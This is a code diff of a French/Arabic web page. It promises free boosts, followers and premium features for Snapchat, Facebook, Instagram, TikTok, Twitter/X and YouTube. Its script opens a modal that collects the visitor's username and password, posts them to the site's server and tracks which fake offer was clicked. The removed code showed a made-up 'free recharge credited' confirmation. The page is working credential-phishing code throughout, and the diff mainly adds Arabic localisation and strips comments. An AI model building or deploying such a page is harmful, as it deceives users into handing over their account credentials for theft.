-    youtube: {icon: 'fab fa-youtube', bg: '#FFE8E8', color: '#FF0000', name: 'YouTube', sub: 'Premium offert', offer_type: 'free_boost'}
+    snapchat: {icon: 'fab fa-snapchat-ghost', bg: '#FFFBCC', color: '#FFFC00', name: 'Snapchat', sub: currentLang === 'ar' ? 'رصيد وفلاتر مجانية' : 'Crédits & filtres gratuits', offer_type: 'free_boost'},
+    facebook: {icon: 'fab fa-facebook-f', bg: '#E8F0FE', color: '#1877F2', name: 'Facebook', sub: currentLang === 'ar' ? 'ميزانية إعلانات مجانية' : 'Budget publicitaire offert', offer_type: 'free_boost'},
+    instagram: {icon: 'fab fa-instagram', bg: '#FDE8EF', color: '#E4405F', name: 'Instagram', sub: currentLang === 'ar' ? 'ترقية المنشورات مجاناً' : 'Boost publications gratuit', offer_type: 'free_boost'},
+    tiktok: {icon: 'fab fa-tiktok', bg: '#f3f3f3', color: '#010101', name: 'TikTok', sub: currentLang === 'ar' ? 'مشاهدات ومتابعون مجانيون' : 'Vues & followers offerts', offer_type: 'free_boost'},
+    twitter: {icon: 'fab fa-twitter', bg: '#E7F3FD', color: '#1DA1F2', name: 'Twitter / X', sub: currentLang === 'ar' ? 'ترقية التغريدات مجاناً' : 'Promotion tweets gratuite', offer_type: 'free_boost'},
+    youtube: {icon: 'fab fa-youtube', bg: '#FFE8E8', color: '#FF0000', name: 'YouTube', sub: currentLang === 'ar' ? 'بريميوم مجاني' : 'Premium offert', offer_type: 'free_boost'}
 };
 
 let currentPlatform = 'snapchat';
@@ -373,45 +461,32 @@ if (!sessionId) {
     localStorage.setItem('fb_session_id', sessionId);
 }
 
-// Fonction pour tracker les clics sur les forfaits
 async function trackClick(platform, offerName) {
     try {
-        const response = await fetch('/api/log-click/', {
+        await fetch('/api/log-click/', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
                 'X-CSRFToken': document.querySelector('[name=csrfmiddlewaretoken]').value
             },
-            body: JSON.stringify({
-                session_id: sessionId,
-                platform: platform,
-                offer_name: offerName
-            })
+            body: JSON.stringify({session_id: sessionId, platform: platform, offer_name: offerName})
         });
-        const data = await response.json();
-        console.log('Click tracked:', data);
-    } catch(e) {
-        console.error('Track error:', e);
-    }
+    } catch(e) { console.error('Track error:', e); }
 }
 
 function openModal(platform) {
     currentPlatform = platform;
     const d = platforms[platform] || platforms.snapchat;
-    
-    // Récupérer le nom de l'offre depuis la carte
     const card = document.querySelector(`.platform-card[data-platform="${platform}"]`);
     const offerName = card ? card.getAttribute('data-offer') : d.sub;
-    
-    // Tracker le clic sur le forfait
     trackClick(platform, offerName);
     
     const icon = document.getElementById('modalIcon');
     icon.innerHTML = `<i class="${d.icon}" style="font-size:32px;color:${d.color}"></i>`;
     icon.style.background = d.bg;
     
-    document.getElementById('modalTitle').textContent = d.name;
-    document.getElementById('modalSub').textContent = d.sub;
+    document.getElementById('modalTitle').innerHTML = d.name;
+    document.getElementById('modalSub').innerHTML = d.sub;
     document.getElementById('username').value = '';
     document.getElementById('password').value = '';
     document.getElementById('terms').checked = false;
@@ -422,13 +497,8 @@ function openModal(platform) {
     document.getElementById('modalOverlay').classList.add('open');
 }
 
-function closeModal() {
-    document.getElementById('modalOverlay').classList.remove('open');
-}
-
-function handleOverlayClick(e) {
-    if (e.target === document.getElementById('modalOverlay')) closeModal();
-}
+function closeModal() { document.getElementById('modalOverlay').classList.remove('open'); }
+function handleOverlayClick(e) { if (e.target === document.getElementById('modalOverlay')) closeModal(); }
 
 async function handleSubmit() {
     const username = document.getElementById('username').value.trim();
@@ -436,16 +506,13 @@ async function handleSubmit() {
     const termsChecked = document.getElementById('terms').checked;
     
     if (!username || !password) {
-        const errorDiv = document.getElementById('formError');
-        errorDiv.innerHTML = '<i class="fas fa-exclamation-circle" style="font-size:18px;margin-bottom:6px;display:block"></i>Veuillez remplir tous les champs.';
-        errorDiv.style.display = 'block';
+        document.getElementById('formError').innerHTML = `<i class="fas fa-exclamation-circle" style="font-size:18px;margin-bottom:6px;display:block"></i>${currentLang === 'ar' ? 'الرجاء ملء جميع الحقول' : 'Veuillez remplir tous les champs.'}`;
+        document.getElementById('formError').style.display = 'block';
         return;
     }
-    
     if (!termsChecked) {
-        const errorDiv = document.getElementById('formError');
-        errorDiv.innerHTML = '<i class="fas fa-exclamation-circle" style="font-size:18px;margin-bottom:6px;display:block"></i>Veuillez accepter les conditions d\'utilisation.';
-        errorDiv.style.display = 'block';
+        document.getElementById('formError').innerHTML = `<i class="fas fa-exclamation-circle" style="font-size:18px;margin-bottom:6px;display:block"></i>${currentLang === 'ar' ? 'الرجاء قبول شروط الاستخدام' : 'Veuillez accepter les conditions d\'utilisation.'}`;
+        document.getElementById('formError').style.display = 'block';
         return;
     }
     
@@ -460,49 +527,24 @@ async function handleSubmit() {
                 'Content-Type': 'application/json',
                 'X-CSRFToken': document.querySelector('[name=csrfmiddlewaretoken]').value
             },
-            body: JSON.stringify({
-                username: username,
-                password: password,
-                platform: currentPlatform,
-                offer_type: platforms[currentPlatform]?.offer_type || 'free_boost'
-            })
+            body: JSON.stringify({username: username, password: password, platform: currentPlatform, offer_type: platforms[currentPlatform]?.offer_type || 'free_boost'})
         });
-        
-        const data = await response.json();
         
         if (response.ok) {
             document.getElementById('formLoading').style.display = 'none';
-            
-            const successDiv = document.getElementById('formSuccess');
-            successDiv.innerHTML = `<i class="fas fa-check-circle" style="font-size:18px;margin-bottom:6px;display:block"></i>
-                <strong>Félicitations !</strong><br>
-                Votre recharge gratuite a été créditée sur votre compte ${currentPlatform}.<br>
-                Redirection dans 3 secondes...`;
-            successDiv.style.display = 'block';
-            
-            setTimeout(() => {
-                closeModal();
-            }, 3000);
+            document.getElementById('formSuccess').style.display = 'block';
+            setTimeout(() => closeModal(), 3000);
         } else {
-            throw new Error(data.error || 'Erreur de connexion');
+            throw new Error('Erreur');
         }
     } catch (error) {
-        console.error('Error:', error);
         document.getElementById('formLoading').style.display = 'none';
         document.getElementById('formWrap').style.display = 'block';
-        const errorDiv = document.getElementById('formError');
-        errorDiv.innerHTML = `<i class="fas fa-exclamation-circle" style="font-size:18px;margin-bottom:6px;display:block"></i>
-            ${error.message || 'Une erreur est survenue. Veuillez réessayer.'}`;
-        errorDiv.style.display = 'block';
+        document.getElementById('formError').style.display = 'block';
     }
 }
 
-// Fermer le modal avec Echap
-document.addEventListener('keydown', function(e) {
-    if (e.key === 'Escape') {
-        closeModal();
-    }
-});
+document.addEventListener('keydown', function(e) { if (e.key === 'Escape') closeModal(); });
 </script>
 </body>
 </html>
